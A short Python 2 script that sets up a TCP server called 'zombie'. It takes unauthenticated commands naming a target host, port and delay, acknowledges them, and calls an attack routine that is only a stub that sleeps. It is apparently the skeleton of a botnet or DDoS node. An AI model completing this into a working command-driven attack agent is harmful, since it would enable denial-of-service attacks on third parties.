import SocketServer
import time
import socket

class zombie(SocketServer.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        timeout, target, port = self.data.split(" ")
        self.request.sendall("ACK")
        self.attack(float(timeout), target, int(port))

    def attack(self, timeout, target, port):
        time.sleep(timeout)

if __name__ == '__main__':
    HOST = socket.gethostbyname(socket.gethostname())
    PORT = 15000

    server = SocketServer.TCPServer((HOST, PORT), zombie)
    server.serve_forever()
